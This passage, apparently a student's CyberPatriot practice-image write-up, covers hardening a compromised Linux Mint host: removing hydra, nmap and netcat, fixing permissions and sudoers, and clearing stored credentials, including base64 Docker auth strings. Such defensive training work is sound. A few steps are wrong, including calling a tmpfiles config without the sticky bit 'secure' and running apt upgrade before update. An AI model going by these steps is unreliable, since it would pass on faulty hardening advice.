* `/usr/local/bin/healthcheck` is a compiled binary, meaning you could use `strings` to examine it further.
Removing `/usr/local/bin/healthcheck` and `/etc/cron.d/.maintenance` remove the malicious persistance mechanism.
### Removed hydra password cracker (T1110) – Hint: This was likely used for SSH brute attack – 3 pts
It is very difficult to find malware on any system, which is why people go through two routes to simplify the process:
* The most intuitive: Baseline a clean Linux Mint 22, and compare it to this version.
* Time consuming: Automate the process of purging malicious malware through scripts.
Personally, I have used the second option, personally skimming every single Kali Linux penetration tool, and purging them if they exist on the system.
```
$ sudo apt purge hydra
```
### Removed nmap network scanner (T1046) – Hint: Check attacker artifacts in jlee's hidden directories – 3 pts
Similarly to the aforementioned vulnerability, either baselining or automation would have caught this non-standard installed package.
```
$ sudo apt purge nmap
```
### Removed netcat-traditional via apt (T1059.004) – Hint: This enables the reverse shells in crontabs – 3 pts
This is a package that should generally be deleted unless it interferes with certain dependencies (like ftp with ubuntu-standard). However, due to the malicious nature of this image, and the regarding the fact that this package was exploited through crontabs, means it would be wise to uninstall it.
```
$ sudo apt purge netcat-traditional
```
### Fixed /etc/shadow permissions (T1003.003/004) – 3 pts
When performing an image, you should always check the permissions of very important files and directories, such as `/etc/shadow` and `/etc/passwd`
* Examining the permissions of /etc/shadow, we can see that the permissions are definitely insecure:
```
mford@botforge:~$ sudo ls -la /etc/shadow
-rw-r--r-- 1 root shadow 2251 Dec 30 00:30 /etc/shadow
```
The last `r` means that anyone that is not root or in the shadow group can read from a file containing **password hashes!**
* To remediate this, run `chmod 640 /etc/shadow`
### Fixed /etc/cron.d permissions – not world-writable (T1053.003 – Cron Modification) – 3 pts
This vulnerability was easy to stumble upon if you ran `ls -la` in /etc/cron.d while investigating for insecure permissions and files.
```
mford@botforge:/etc/cron.d$ ls -la
total 44
drwxrwxrwx   2 root root  4096 Jan 19 11:48 .
drwxr-xr-x 160 root root 12288 Jan 19 12:00 ..
-rw-r--r--   1 root root   219 Nov 17  2023 anacron
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-rw-r--r--   1 root root   148 Nov 20  2024 .maintenance
-rw-r--r--   1 root root   712 Jan 18  2024 php
-rw-r--r--   1 root root   102 Mar 30  2024 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
-rw-r--r--   1 root root   377 Apr 18  2024 zfsutils-linux
```
The `.` entry represents /etc/cron.d/, and it tells us that anyone can read, write, or execute any file in this directory.
* To remediate this, set /etc/cron.d/ to its default permission: `chmod 751 /etc/cron.d/`
### Removed secrets from webroot .env file (T1552.001 - Credentials in Files) - 3 pts
After stumbling upon the `.env` file in `/var/www/dashboard/`, the most wisest path of action is to move it and isolate it in a different directory.
* This prevents attackers from potentially compromising our important credentials, secrets, and keys.
In this practice image, I simply moved it to `/root/.env` and a more secure location can be chosen later.
```
$ sudo mv .env /root/.env
```
Hence, we gain points for eliminating a really important vulnerability.
### Fixed tmpfiles.d config /tmp bash sticky bit (T1222 – File Permission Modification) – 3 pts
A sticky bit, is a bit permission that disallows people from deleting files they do not themselves own. This is extremely important as `/tmp/` is a word-writable directory. The directory associated with assigning these attributes is `/etc/tmpfiles.d/`, and upon examining it, we see that there is a file `/etc/tmpfiles.d/tmp.conf` with suspicious contents:
```
d /tmp 0777 root root -
d /var/tmp 0777 root root -
```
This configuration is secure because we are not assigning the sticky bit to the two world-writable directories `/tmp/` and `/var/tmp/`. To remediate this, we change the 0 bit to a 1 to represnt the sticky bit:
```
d /tmp 1777 root root -
d /var/tmp 1777 root root -
```
### Removed execution from /tmp on srv.log (T1222 – File Permissions) – 3 pts

### Cleared credentials from root bash history (T1552.003 – Bash History) – 3 pts
Following Forensics Question 1, it was a hint to us that the .bash_history files can contain vital information. Applying this observation to other accounts such as `root`, you come to find that there are credentials that if leaked, pose an immediate security risk. Hence, by clearing out `/root/.bash_history`, you significantly minimize risk.
```
ln -sf /dev/null .bash_history
```
* This ensures that any recorded actions of `root` are immediately nulled.
### Removed Docker registry credentials from config (T1552.001 – Credentials in Files) – 3 pts
The workstation has been compromised, and so keeping authentication tokens, especially those that have not changed since the attack, is extremely bad practice. Hence, we should remove the authentication table stored in `/home/mford/.docker/config.json` due to their active ability to be abused.
```json
{
    --> "auths": {
        "https://index.docker.io/v1/": {
            "auth": "Ym90Zm9yZ2U6UHJvZHVjdGlvbjIwMjQh"
        },
        "ghcr.io": {
            "auth": "bWZvcmQ6Z2hwX2Zha2V0b2tlbjEyMzQ1Njc4OQ=="
        }
    }, <--
    "credsStore": "",
    "currentContext": "default"
}
```
The previous configuration becomes the one below:
```json
{
    "credsStore": "",
    "currentContext": "default"
}
```
### Removed NOPASSWD from mford sudoers entry (T1548.003 – Sudo) – 3 pts
After investigating `/etc/sudoers.d/`, there were many suspicious files. One such file was `mford`, which allowed user `mford` to escalate privileges without a password.
* To remediate this vulnerability, simply delete the file: `rm /etc/sudoers.d/mford`
### Removed overly permissive botrunner sudo access (T1548.003 – Sudo) – 3 pts
After investigating `/etc/sudoers.d/`, there were many suspicious files. One such file was `botforge`, which allowed users `botrunner` and `webhook` to escalate privileges without passwords.
* To remediate this vulnerability, simply delete the file: `rm /etc/sudoers.d/botforge`
### System packages updated (CIS 7.1 – Mitigates T1190, T1203) – 3 pts
Updating your packages is important to maintain security updates for the applications and services running on your machine.
* This significantly reduces risks of attack vectors, ensuring your workstation is safer overall.
```bash
$ sudo apt upgrade
$ sudo apt update
```
### Enabled automatic security updates – 3 pts
Enabling automatic security updates ensure the system receives important updates continously that patch recognized vulnerabilities, thus reducing the attack vector and minimizing risk.
```
$ sudo apt install unattended-upgrades
$ sudo dpkg-reconfigure unattended-upgrades
```

## Score Report:
* ![Score Report P1](assets/score-report-1.png)
* ![Score Report P2](assets/score-report-2.png)

## Credit
Thank you to Tirefire and the entire CyberPatriot community for assisting me crack the final few vulnerabilities.